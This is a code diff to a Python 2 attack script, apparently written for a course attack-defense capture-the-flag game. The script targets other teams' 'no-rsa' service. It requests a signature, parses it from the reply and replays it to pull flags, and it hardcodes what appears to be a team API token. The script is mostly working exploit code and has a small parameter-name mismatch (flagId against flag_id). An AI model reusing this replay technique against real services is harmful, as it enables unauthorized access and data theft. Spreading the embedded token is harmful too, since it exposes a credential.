@@ -7,18 +7,32 @@ def netcat(hostname, port, content):
     s.connect((hostname, port))
     s.sendall(content)
     s.shutdown(socket.SHUT_WR)
+    ret_list = []
     while 1:
         data = s.recv(1024)
         if data == "":
             break
-        print "Received:", repr(data)
-    print "Connection closed."
+        ret_list.append(repr(data))
+        #print "Received:", repr(data)
+    #print "Connection closed."
     s.close()
+    return ret_list
 
 def exploit_no_rsa(hostname, port, flagId):
     print 'hostname:',hostname, 'port:',port, 'flagId:', flag_id
     content = 'S'+ "\n" + '0' + flag_id
-    netcat(hostname, port, content)
+    ret_list = netcat(hostname, port, content)
+    print 'ret_list:', ret_list
+    sigLine = ret_list[2]
+    print 'sigline:',sigLine
+    lineArr = sigLine.split('\n')
+    print 'lineArr:', lineArr
+    sig = lineArr[1]
+    print 'sig:', sig
+    content = 'R' + "\n" + flag_id + ' ' + sig
+    print 'content:', content
+    ret_list = netcat(hostname, port, content)
+    print ret_list
 
 t = Team("http://actf0.cse545.rev.fish/", "lpmrUtF4wT1mu5FnVN6Tt82LnK1j9n5d")
 print(t.game_url)
@@ -44,3 +58,4 @@ for service in services:
         flag_id = target['flag_id']
         if service_name == 'no-rsa':
             exploit_no_rsa(hostname,port,flag_id)
+        break
